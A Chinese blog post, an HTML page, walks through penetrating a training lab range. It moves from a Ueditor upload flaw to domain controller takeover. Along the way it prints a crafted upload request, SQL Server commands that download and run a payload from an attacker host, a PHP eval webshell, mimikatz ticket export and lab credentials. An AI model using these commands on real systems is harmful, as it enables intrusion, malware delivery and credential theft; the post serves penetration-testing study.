@@ -1,0 +1,330 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>暗月atk123靶场渗透 | Nice's Blog</title><meta name="keywords" content="靶场"><meta name="author" content="Nice"><meta name="copyright" content="Nice"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境搭建这个靶场来自暗月内网渗透 主要考点 Text123456789101112站库分离外网打点过360全家桶过windwos defender过火绒内网漫游多层网络渗透横向渗透jwt token密钥破解权限提升域渗透phpmyadmin写shellsqlserver提权 靶场拓扑  账号信息 Text1234567812server-web1 本地管理员和账号 administrator QW">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暗月atk123靶场渗透">
+<meta property="og:url" content="http://nice759.com/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Nice&#39;s Blog">
+<meta property="og:description" content="环境搭建这个靶场来自暗月内网渗透 主要考点 Text123456789101112站库分离外网打点过360全家桶过windwos defender过火绒内网漫游多层网络渗透横向渗透jwt token密钥破解权限提升域渗透phpmyadmin写shellsqlserver提权 靶场拓扑  账号信息 Text1234567812server-web1 本地管理员和账号 administrator QW">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png">
+<meta property="article:published_time" content="2022-04-06T10:47:12.000Z">
+<meta property="article:modified_time" content="2022-04-06T10:48:19.403Z">
+<meta property="article:author" content="Nice">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://nice759.com/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?fa254ca04b2501989f5cb00fe51f3cb3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-06 18:48:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Nice's Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/images/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/Categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/Categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Nice's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/Categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">暗月atk123靶场渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-06T10:47:12.000Z" title="发表于 2022-04-06 18:47:12">2022-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-06T10:48:19.403Z" title="更新于 2022-04-06 18:48:19">2022-04-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/Categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这个靶场来自暗月内网渗透</p>
+<p>主要考点</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">站库分离外网打点</span><br><span class="line">过360全家桶</span><br><span class="line">过windwos defender</span><br><span class="line">过火绒</span><br><span class="line">内网漫游</span><br><span class="line">多层网络渗透</span><br><span class="line">横向渗透</span><br><span class="line">jwt token密钥破解</span><br><span class="line">权限提升</span><br><span class="line">域渗透</span><br><span class="line">phpmyadmin写shell</span><br><span class="line">sqlserver提权</span><br></pre></td></tr></table></figure>
+<p>靶场拓扑</p>
+<p><img src="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png" alt="image.png"></p>
+<p>账号信息</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">12server-web1 本地管理员和账号 administrator QWEasd.123</span><br><span class="line"> www.ackmoon.com admin password-moon</span><br><span class="line"> 12server-web2 本地管理员账号和密码 administrator QWEasd.999</span><br><span class="line"> mysql root Qweasdzxc5 域普通用户 web2 QWEasd.7788</span><br><span class="line"> 12server-data1 本地管理员账号和密码 administrator QWEasd.789x</span><br><span class="line"> sqlserver sa pass123@.com</span><br><span class="line"> 12server-data2 本地管理员账号和密码 administrator P@55w0rd!</span><br><span class="line"> 16server-dc 域管理员 administrator P@55w0rd!</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>访问<a target="_blank" rel="noopener" href="http://www.ackmoon.com/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%98%AFHDHCMS%E6%90%AD%E5%BB%BA%E7%9A%84%E7%BD%91%E7%AB%99">http://www.ackmoon.com/可以看到是HDHCMS搭建的网站</a></p>
+<p><img src="https://s2.loli.net/2022/04/05/4v2Kg6JlUyWcqXB.png" alt="image.png"></p>
+<p>来找一下历史漏洞</p>
+<p>发现cnvd上存在一个伪造cookie登录后台的，但是并没有找到相关细节</p>
+<p><img src="https://s2.loli.net/2022/04/05/waU5VFLCO1MuIAH.png" alt="image.png"></p>
+<p>其他的信息收集</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">扫目录：发现admin后台目录</span><br><span class="line">看前端源码：没发现</span><br><span class="line">乱点：没错，就是乱点</span><br><span class="line">后台账户爆破：没结果</span><br><span class="line">后台用户注册</span><br><span class="line">Cookie格式，尝试伪造</span><br></pre></td></tr></table></figure>
+<p>搜索框  ‘ 尝试，有报错（乱点的）</p>
+<p><img src="https://s2.loli.net/2022/04/05/PSDOQecbWNTAoxa.png" alt="image.png"></p>
+<p>这是注出了一个0day？</p>
+<p><img src="https://s2.loli.net/2022/04/05/2FhWyoqPtCBTkaJ.png" alt="image.png"></p>
+<p>与此同时，通过注册用户看看后台</p>
+<p>发现存在<strong>百度Ueditor 1.4.3</strong></p>
+<p><img src="https://s2.loli.net/2022/04/05/hckamoPFSqrHpNT.png" alt="image.png"></p>
+<p>这个编辑器存在一个任意文件上传漏洞，我们利用一下</p>
+<p>找到上传接口 <strong>/admin/net/controller.ashx?action=catchimage</strong></p>
+<p>构造上传</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;net&#x2F;controller.ashx?action&#x3D;catchimage HTTP&#x2F;1.1</span><br><span class="line">Host: www.ackmoon.com</span><br><span class="line">Content-Length: 50</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.4844.84 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">source[]&#x3D;http:&#x2F;&#x2F;192.168.3.187:8080&#x2F;shell.jpg.?aspx</span><br></pre></td></tr></table></figure>
+
+
+<p>蚂蚁连接</p>
+<p><img src="https://s2.loli.net/2022/04/05/BogF9L3I2nT4EjO.png" alt="image.png"></p>
+<p>能连，执行命令会被拦截，换一个马试试</p>
+<p><img src="https://s2.loli.net/2022/04/05/IwyxJVPgNnkivRU.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/04/05/nIqE5oLsvuQYVgP.png" alt="image.png"></p>
+<p>杀软识别，360全家桶</p>
+<p><img src="https://s2.loli.net/2022/04/05/Oc4zyL3hAd8Deag.png" alt="image.png"></p>
+<p>用ZheTian框架免杀上线</p>
+<p><img src="https://s2.loli.net/2022/04/05/yPQpM6ZTjiX9wVI.png" alt="image.png"></p>
+<p>烂土豆提权</p>
+<p><img src="https://s2.loli.net/2022/04/05/DvSqznYhodIFOm4.png" alt="image.png"></p>
+<p>webshell翻一翻，找到数据库配置文件</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库地址：192.168.22.133</span><br><span class="line">用户名&#x2F;密码：sa&#x2F;pass123@.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/05/rOQBCNDpGA2Mft7.png" alt="image.png"></p>
+<p>cs加代理，本地挂代理用navicat连接</p>
+<p><img src="https://s2.loli.net/2022/04/05/97OP3mwa1pIBsUh.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/04/05/GeKOPJzj9dV2EAo.png" alt="image.png"></p>
+<p>关于xp_cmdshell的一些判断</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">判断权限是不是sa </span><br><span class="line"></span><br><span class="line">select is_srvrolemember(&#39;sysadmin&#39;) </span><br><span class="line"></span><br><span class="line">返回是1说明是sa </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">判断xp_cmdshell扩展存储是否存在 </span><br><span class="line"></span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; AND name&#x3D; &#39;xp_cmdshell&#39; </span><br><span class="line">返回为1则证明存在 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">判断xp_regread扩展存储过程是否存在 </span><br><span class="line"></span><br><span class="line">select count(*) from master.dbo.sysobjects where name&#x3D;&#39;xp_regread&#39;  </span><br><span class="line">返回1证明存在 </span><br></pre></td></tr></table></figure>
+<p>大费周折之后发现用powershell的时候直接拒绝使用了</p>
+<p>百度发现可以用sp_oacreate执行命令</p>
+<p>开启sp_oacreate：</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">exec sp_configure &#39;Ole Automation Procedures&#39;, 1;  </span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p>测试出网情况</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Declare @runshell INT Exec SP_OACreate &#39;wscript.shell&#39;,@runshell out Exec SP_OAMeTHOD @runshell,&#39;run&#39;,null,&#39;ping xxxx.ceye.io&#39;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/05/8iMXv7olFQ5WVEu.png" alt="image.png"></p>
+<p>下载cs马</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;C:\Windows\System32\certutil.exe&#39; ,&#39;c:\windows\temp\do.exe&#39;;  #将certutil.exe复制到c:\windows\temp\下，并重命名为do.exe</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\Windows\Temp\do.exe -urlcache -split -f &quot;http:&#x2F;&#x2F;192.168.3.187:8080&#x2F;1.exe&quot; C:\Windows\Temp\1.exe&#39; #使用命令远程下载exe文件</span><br><span class="line">Declare @runshell INT Exec SP_OACreate &#39;wscript.shell&#39;,@runshell out Exec SP_OAMeTHOD @runshell,&#39;run&#39;,null,&#39;forfiles &#x2F;c 1.exe&#39;; #执行</span><br></pre></td></tr></table></figure>
+<p>这里执行的时候我又失败了</p>
+<p>既然如此那就用上线web1的方法，用ZheTian免杀框架</p>
+<p>成功上线</p>
+<p><img src="https://s2.loli.net/2022/04/05/V9GbyOZadEHhwMD.png" alt="image.png"></p>
+<p><strong>systeminfo</strong>跟web1一样，再次用烂土豆提权</p>
+<p><img src="https://s2.loli.net/2022/04/05/VOPr9jfF4EHMs7e.png" alt="image.png"></p>
+<p><strong>lanzagne</strong>读一下<strong>data1</strong>密码</p>
+<p><img src="https://s2.loli.net/2022/04/05/bCm7OSW269YcIyQ.png" alt="image.png"></p>
+<p><strong>fc6ad1748c1d0eacee6adff0c6516dbb</strong>用NTML解密出来的密码是<strong>QWEasd.789x</strong></p>
+<p>我们直接远程登录data1，同样给mstsc.exe挂上代理</p>
+<p>没啥好玩的，fscan搜集下信息</p>
+<p>发现web2地址</p>
+<p><img src="https://s2.loli.net/2022/04/05/vpeYlmx2RjbFoIV.png" alt="image.png"></p>
+<p>浏览器用之前的socks代理访问</p>
+<p>提示JWT</p>
+<p><img src="https://s2.loli.net/2022/04/05/FneqQSXaI2OfTdN.png" alt="image.png"></p>
+<p>hashcat解密出来</p>
+<p><img src="https://s2.loli.net/2022/04/05/3VTgfmRjMKcuHBd.png" alt="image.png"></p>
+<p>伪造admin用户</p>
+<p><img src="https://s2.loli.net/2022/04/05/feb2IS97lJswzNy.png" alt="image.png"></p>
+<p>但是什么也没有，属实卡住了</p>
+<p>最后看了官方解答才知道这里有个phpmyadmin（属实狭窄了，竟然没想过跑目录）</p>
+<p>而且这里的密码竟然是JWT的密钥！绝了！</p>
+<p><img src="https://s2.loli.net/2022/04/05/WvhC6Zg4nV2qJyS.png" alt="image.png"></p>
+<p>那就phpmyadmin写shell</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_Name LIKE &quot;%dir&quot; #查路径</span><br><span class="line">set global general_log&#x3D;&#39;on&#39; #开日志</span><br><span class="line">set global general_log_file&#x3D;&#39;C:\\phpstudy_pro\\WWW\\shell.php&#39;; #设置日志路径</span><br><span class="line">show global variables like &quot;%genera%&quot; #查看写入情况</span><br><span class="line">select &#39;&lt;?php @eval($_POST[&quot;aaa&quot;]); ?&gt;&#39;; #写一句话</span><br></pre></td></tr></table></figure>
+<p>写完蚂蚁连接</p>
+<p>这里竟然直接是system，这是对JWT那里的补偿吗哈哈</p>
+<p><img src="https://s2.loli.net/2022/04/05/PtLbSyaeJCl9YDf.png" alt="image.png"></p>
+<p>发现不出网</p>
+<p>那就用data1作为跳板机监听web2上线</p>
+<p><img src="https://s2.loli.net/2022/04/05/dpxaHo1tMAGOTfK.png" alt="image.png"></p>
+<p>定位到域控10.10.10.135</p>
+<p><img src="https://s2.loli.net/2022/04/05/hcybumZNBQSvGMI.png" alt="image.png"></p>
+<p>存在SPN服务</p>
+<p><img src="https://s2.loli.net/2022/04/05/BvFOXUgq95mDSjJ.png" alt="image.png"></p>
+<p>mimikatz导出票据</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list          #查看</span><br><span class="line">mimikatz kerberos::list &#x2F;export  #导出</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/05/s5tEWFirnPZ3JuA.png" alt="image.png"></p>
+<p>用<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">tgsrepcrack.py</a>进行爆破</p>
+<p>得到密码P@55w0rd!</p>
+<p><img src="https://s2.loli.net/2022/04/05/yPetkz16x7Es8qR.png" alt="image.png"></p>
+<p>psexec横向传递</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portscan 10.10.10.0&#x2F;24 445 扫描域内存活主机</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/05/MzCA4FS2sdTZmKG.png" alt="image.png"></p>
+<p>在web2上创建一个SMB监听</p>
+<p>对存活主机进行psexec横向</p>
+<p><img src="https://s2.loli.net/2022/04/05/FDch38lBPRx4iwC.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/04/05/sQHznL8OdVpCMuW.png" alt="image.png"></p>
+<p>域控上线</p>
+<p><img src="https://s2.loli.net/2022/04/05/haozlSeEuWbsHGZ.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/04/05/zgkolGLbpUI5Tme.png" alt="image.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>渗透过程中遇到不少坑，还是经验不太够~</p>
+<p>多参考百度~</p>
+<p>百度是最好的老师~</p>
+<p>bypass真的很重要！</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcxblogs/p/14214620.html">https://www.cnblogs.com/lcxblogs/p/14214620.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yqcs/ZheTian">https://github.com/yqcs/ZheTian</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sup3rman/p/13071382.html">https://www.cnblogs.com/sup3rman/p/13071382.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9d5e8236647e">https://www.jianshu.com/p/9d5e8236647e</a></p>
+<p>还好有多大佬们的思路</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Nice</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://nice759.com/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">http://nice759.com/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://nice759.com" target="_blank">Nice's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://s2.loli.net/2022/03/30/GRSgAxHcqhEbayM.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Nice</div><div class="author-info__description">E-mail:1452165544@qq.com</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div><div class="card-info-data-item is-center"><a href="/Categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">声明：本博客所有内容均用于学习研究，请勿用于非法用途，后果自负！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span 